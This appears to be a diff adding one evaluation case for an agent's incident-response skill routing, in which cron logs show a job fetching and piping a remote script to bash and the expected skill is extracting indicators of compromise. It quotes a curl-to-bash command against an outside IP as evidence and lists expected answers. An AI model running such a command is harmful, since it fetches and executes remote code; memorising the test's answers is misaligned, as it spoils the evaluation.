@@ -1,0 +1,7 @@
+{
+    "case_id": "EVAL-mainline-extracting-5",
+    "evidence_summary": "journalctl output shows repeated cron job executions of: /bin/bash -c 'curl -s http://203.0.113.77/update | bash'. The URL changes each hour (update, update2, patch, patch2). Operator wants all distinct URLs extracted, clustered by second-level domain, and tagged with first-seen timestamps from the journal entries.",
+    "expected_skill": "extracting-iocs",
+    "expected_resource_reads": ["/skills/extracting-iocs-corpus.md"],
+    "min_correlation_streams": 1
+}
